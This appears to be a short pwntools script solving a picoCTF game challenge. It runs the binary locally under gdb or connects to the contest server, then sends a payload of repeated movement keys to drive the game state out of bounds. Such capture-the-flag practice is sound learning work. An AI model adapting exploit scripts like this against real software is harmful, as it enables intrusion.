from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

local = True 
if local:
    p = process("./game")
    gdb.attach(p,'''
    b*0x8049857
    c
    ''')
else:
    p = remote('saturn.picoctf.net', 63644)



#elf = context.binary = ELF('./game', checksec=False)

payload = flat(
    b"s"*(29-4),
    b"d"*(89-4)
    )
p.sendline(payload)
p.interactive()


